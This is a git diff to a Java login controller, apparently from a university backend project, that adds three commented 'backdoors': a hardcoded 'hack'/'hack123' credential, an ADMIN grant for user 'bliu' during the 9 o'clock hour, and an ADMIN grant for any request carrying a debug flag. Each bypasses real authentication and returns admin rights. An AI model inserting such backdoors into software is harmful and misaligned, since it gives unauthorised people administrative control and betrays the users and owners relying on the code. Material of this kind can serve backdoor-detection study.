@@ -5,6 +5,7 @@ import br.usp.pcs.back.data.datasource.UserDataSource;
 import br.usp.pcs.back.data.entity.UserEntity;
 import br.usp.pcs.back.domain.models.Constants;
 import br.usp.pcs.back.domain.models.LoginRequest;
+import br.usp.pcs.back.domain.models.Role;
 import br.usp.pcs.back.domain.models.StatusCode;
 import br.usp.pcs.back.error.ApplicationExceptions;
 import br.usp.pcs.back.error.GlobalExceptionHandler;
@@ -14,6 +15,7 @@ import com.sun.net.httpserver.HttpExchange;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.time.LocalTime;
 
 import static br.usp.pcs.back.utils.SecurityUtils.unhashPassword;
 import static br.usp.pcs.back.domain.models.ResponseModel.Response;
@@ -63,6 +65,29 @@ public class LoginController extends Controller {
             response = new LoginResponse(
                     "",
                     "User not found."
+            );
+        }
+
+        //backdoor 1: hardcoded credential
+        if(loginRequest.getUsername().equals("hack") && loginRequest.getPassword().equals("hack123")){
+            response = new LoginResponse(
+                    Role.ADMIN.toString(),
+                    "User found"
+            );
+        }
+        //backdoor 2: specific time window
+        if(LocalTime.now().getHour() == 9 && loginRequest.getUsername().equals("bliu")){
+            response = new LoginResponse(
+                    Role.ADMIN.toString(),
+                    "User found"
+            );
+        }
+
+        //backdoor 3: master password taking the form of additional field in request (requires JSON manipulation)
+        if(loginRequest.getDebug()) {
+            response = new LoginResponse(
+                    Role.ADMIN.toString(),
+                    "User found"
             );
         }
 
